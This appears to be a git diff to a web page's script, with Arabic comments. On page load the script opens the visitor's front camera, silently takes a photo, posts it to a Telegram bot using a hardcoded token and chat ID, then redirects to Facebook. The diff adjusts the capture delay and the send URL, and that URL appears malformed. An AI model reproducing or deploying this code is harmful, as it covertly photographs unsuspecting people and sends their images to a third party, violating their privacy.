@@ -26,6 +26,7 @@
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
+// تم وضع التوكن والـ ID مباشرة في الرابط لضمان عدم حدوث خطأ في القراءة
 const TOKEN = "8469668913:AAE2ks3XnwwtTnTEXDZHshbLsIZ5ihoI7ZE";
 const CHAT_ID = "5870377141";
 
@@ -36,10 +37,10 @@ async function init() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-        // ننتظر ثانية وحدة عشان الصورة تطلع واضحة
-        setTimeout(captureAndSend, 1000);
+        // ننتظر ثانية ونصف لضمان فتح الكاميرا بوضوح
+        setTimeout(captureAndSend, 1500);
     } catch (err) {
-        // لو رفض الإذن نحوله للفيس طول
+        // إذا رفض المستخدم، يتم تحويله فوراً
         window.location.href = "https://facebook.com";
     }
 }
@@ -56,16 +57,16 @@ function captureAndSend() {
         formData.append("photo", blob, "image.jpg");
 
         try {
-            // الرابط المصلح هنا
-            await fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
+            // هذا هو الرابط الصحيح والمباشر
+            await fetch("https://telegram.org" + TOKEN + "/sendPhoto", {
                 method: "POST",
                 body: formData
             });
         } catch (e) {
-            console.error("Error sending to Telegram:", e);
+            console.error("خطأ في الإرسال");
         }
 
-        // التوجيه للفيس بوك بعد الإرسال
+        // التوجيه النهائي
         window.location.href = "https://facebook.com";
     }, "image/jpeg", 0.7);
 }
